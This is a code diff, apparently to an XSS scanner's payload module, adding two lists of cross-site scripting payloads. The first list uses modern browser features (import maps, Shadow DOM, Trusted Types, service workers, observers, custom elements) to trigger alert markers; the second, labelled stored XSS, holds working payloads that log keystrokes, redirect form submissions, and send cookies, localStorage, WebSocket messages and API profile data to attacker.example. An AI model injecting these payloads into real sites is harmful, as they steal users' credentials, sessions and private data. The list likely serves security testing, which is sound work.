@@ -168,6 +168,63 @@ ENCODING = [
     "&#60;script&#62;alert('{marker}')&#60;/script&#62;",
 ]
 
+# Modern browser API abuse — Import Maps, Shadow DOM, Trusted Types, Service Worker, Observers
+MODERN_BROWSER = [
+    # Import Maps abuse
+    "<script type=\"importmap\">{{\"imports\": {{\"x\": \"data:text/javascript,alert('{marker}')\"}}}}</script>"
+    "<script type=\"module\">import 'x'</script>",
+    # Shadow DOM injection
+    "<div id=host></div><script>host.attachShadow({{mode:'open'}}).innerHTML="
+    "'<img src=x onerror=alert(\\'{marker}\\')>'</script>",
+    # Trusted Types bypass
+    "<script>trustedTypes.createPolicy('p',{{createHTML:_=>'<img src=x onerror=alert(\\'{marker}\\')>'}})"
+    ".createHTML('')</script>",
+    # Service Worker injection
+    "<script>navigator.serviceWorker.register('data:text/javascript,alert(\\'{marker}\\')')</script>",
+    # MutationObserver abuse
+    "<script>var o=new MutationObserver(function(m){{alert('{marker}');o.disconnect();}});"
+    "o.observe(document.body,{{subtree:true,childList:true}})</script>"
+    "<img src=x>",
+    # IntersectionObserver abuse
+    "<script>new IntersectionObserver(([e])=>{{if(e.isIntersecting)alert('{marker}')}}).observe(document.body)</script>",
+    # ResizeObserver abuse
+    "<script>new ResizeObserver(()=>alert('{marker}')).observe(document.body)</script>",
+    # Custom Elements abuse
+    "<script>customElements.define('xss-{marker}',class extends HTMLElement{{"
+    "connectedCallback(){{alert('{marker}')}}}});</script><xss-{marker}></xss-{marker}>",
+    # Template element injection
+    "<template><img src=x onerror=alert('{marker}')></template>"
+    "<script>document.body.appendChild(document.querySelector('template').content.cloneNode(true))</script>",
+    # Blob URL exploitation
+    "<script>window.open(URL.createObjectURL(new Blob(['<script>alert(\\'{marker}\\')<\\/script>'],"
+    "{{type:'text/html'}})))</script>",
+    # CSS :target + onanimationcancel (constructor-event abuse)
+    "<style>@keyframes x{{from{{left:0}}to{{left:1000px}}}}:target{{animation:10s ease-in-out 0s 1 x;}}</style>"
+    "<xss id=x style=\"position:fixed;\" onanimationcancel=\"alert('{marker}')\"></xss>",
+]
+
+# Stored XSS payloads — keylogger, form hijacking, WebSocket hijacking
+STORED_XSS = [
+    # Keylogger
+    "<script>document.onkeypress=function(e){{fetch('//attacker.example/log?k='+e.key+'&m={marker}')}}</script>",
+    # Form hijacking
+    "<script>document.forms[0]&&(document.forms[0].action='//attacker.example/logger?m={marker}')</script>",
+    # Advanced cookie + localStorage exfil
+    "<script>var x=new XMLHttpRequest();x.open('POST','//attacker.example/logger',true);"
+    "x.send(JSON.stringify({{url:window.location.href,cookies:document.cookie,"
+    "ls:JSON.stringify(localStorage),marker:'{marker}'}}));</script>",
+    # WebSocket hijacking
+    "<script>var ws=new WebSocket('wss://'+window.location.host+'/ws');"
+    "ws.onmessage=function(e){{fetch('//attacker.example/ws?d='+btoa(e.data)+'&m={marker}')}};</script>",
+    # Session token exfil from API
+    "<script>fetch('/api/user/profile').then(r=>r.json())"
+    ".then(d=>fetch('//attacker.example/data?d='+btoa(JSON.stringify(d))+'&m={marker}'))"
+    ".catch(()=>{{}})</script>",
+    # localStorage poisoning
+    "<script>localStorage.setItem('xss','<img src=x onerror=alert(\\'{marker}\\')>');"
+    "document.write(localStorage.getItem('xss'))</script>",
+]
+
 # Content-type vectors — SVG, XML, XSL, XHTML responses
 CONTENT_TYPE = [
     "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('{marker}')\"/>",
